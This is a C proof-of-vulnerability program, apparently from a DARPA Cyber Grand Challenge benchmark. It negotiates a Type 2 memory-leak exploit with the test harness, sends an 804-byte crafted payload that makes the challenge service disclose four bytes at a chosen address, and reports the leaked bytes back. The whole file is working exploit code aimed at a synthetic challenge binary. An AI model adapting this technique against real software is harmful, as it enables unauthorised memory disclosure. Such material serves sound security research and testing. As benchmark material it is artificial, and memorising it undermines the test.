#include <libcgc.h>

int senddata(int fd, void *outdata, const size_t size) {
    size_t tx_bytes = 0;
    size_t count = 0;

    if ( outdata == NULL) {
        return -1;
    } 

    while (count < size) {
        if ( transmit(fd, outdata + count, size - count, &tx_bytes) != 0 ) {
            _terminate(0);
        }

        if (tx_bytes <= 0) {
            _terminate(0);
        }

        count += tx_bytes;
    }

    return 0;
}

int recvdata(int fd, void *indata, const size_t size ) {
    size_t rx_bytes = 0;
    size_t total = 0;

    if (indata == NULL ) {
        return -1;
    } 

    while (rx_bytes < size) {
        if ( receive(fd, indata + total, size-total, &rx_bytes) != 0 ) {
            _terminate(0);
        }

        total += rx_bytes;
    }

    return 0;
}


int main(void)
{
	/// Type 1 POV Is control of PC and a reg
	int pov_type = 2;

	// I have full control of the register and pc
	unsigned int type2_addr = 0;
	int type2_size = 0;
	int type2_length = 0;

	unsigned int end = 0x31337;

	unsigned char out[804];
	int value;

	if (senddata(3, &pov_type, sizeof(pov_type)) != 0) {
		_terminate(-1);
	}

	if (recvdata(3, &type2_addr, sizeof(type2_addr)) != 0) {
		_terminate(-1);
	}

	if (recvdata(3, &type2_size, sizeof(type2_size)) != 0) {
		_terminate(-1);
	}

	if (recvdata(3, &type2_length, sizeof(type2_length)) != 0) {
		_terminate(-1);
	}
	
	/// Read the prompt
	recvdata(0, out, 18);
	
	for ( value = 0; value < 804; value++) {
		out[value] = 0;
	}

	out[803] = (type2_addr >> 24) & 0xff;
	end -= (type2_addr >> 24) & 0xff;

	out[802] = (type2_addr >> 16) & 0xff;
	end -= (type2_addr >> 16) & 0xff;

	out[801] = (type2_addr >> 8) & 0xff;
	end -= (type2_addr >> 8) & 0xff;

	out[800] = type2_addr & 0xff;
	end -= type2_addr & 0xff;

	for ( value = 0; value < 800 && end; value++ ){
		if ( 255 < end ) {
			out[value] = 0xff;
			end -= 0xff;
		} else {
			out[value] = end;
			end = 0;
		}
	}

	value = 804;

	senddata(1, &value, sizeof(value));
	senddata(1, out, 804);

	recvdata( 0, out, 8);

	for ( value = 0; value < 804; value++) {
		out[value] = 0;
	}

	for ( value = 0; value < 4; value++) {
		recvdata( 0, out + value, 1);
	}
	
	senddata( 3, out, 4);


	return 0;
}

